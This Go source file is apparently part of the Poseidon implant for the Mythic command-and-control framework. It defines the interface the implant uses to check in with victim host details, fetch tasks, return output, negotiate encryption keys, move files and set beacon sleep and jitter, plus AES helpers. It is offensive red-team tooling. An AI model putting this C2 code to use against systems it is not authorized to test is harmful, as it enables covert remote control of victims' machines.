package profiles

import (
	// Standard
	"encoding/base64"
	"encoding/json"
	"math/rand"
	"sync"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

var (
	// UUID is a per-payload identifier assigned by Mythic during creation
	UUID            string
	SeededRand      = rand.New(rand.NewSource(time.Now().UnixNano()))
	TaskResponses   []json.RawMessage
	UploadResponses []json.RawMessage
	mu              sync.Mutex
)

// Profile is the primary client interface for Mythic C2 profiles
type Profile interface {
	// CheckIn method for sending the initial checkin to the server
	CheckIn(ip string, pid int, user string, host string, os string, arch string) interface{}
	// GetTasking method for retrieving the next task from Mythic
	GetTasking() interface{}
	// PostResponse is used to send a task response to the server
	PostResponse(output []byte, skipChunking bool) []byte
	// NegotiateKey starts the Encrypted Key Exchange (EKE) negotiation for encrypted communications
	NegotiateKey() string
	// SendFile is used for downloading files
	SendFile(task structs.Task, params string, ch chan []byte)
	// GetFile gets a file with specified id
	GetFile(r structs.FileRequest, ch chan []byte) ([]byte, error)
	SendFileChunks(task structs.Task, data []byte, ch chan []byte)
	SleepInterval() int
	SetSleepInterval(interval int)
	SetSleepJitter(jitter int)
	ApfID() string
	SetApfellID(newID string)
	ProfileType() string
}

func EncryptMessage(msg []byte, k string) []byte {
	key, _ := base64.StdEncoding.DecodeString(k)
	return crypto.AesEncrypt(key, msg)
}

func DecryptMessage(msg []byte, k string) []byte {
	key, _ := base64.StdEncoding.DecodeString(k)
	return crypto.AesDecrypt(key, msg)
}

func GenerateSessionID() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 20)
	for i := range b {
		b[i] = letterBytes[SeededRand.Intn(len(letterBytes))]
	}
	return string(b)
}
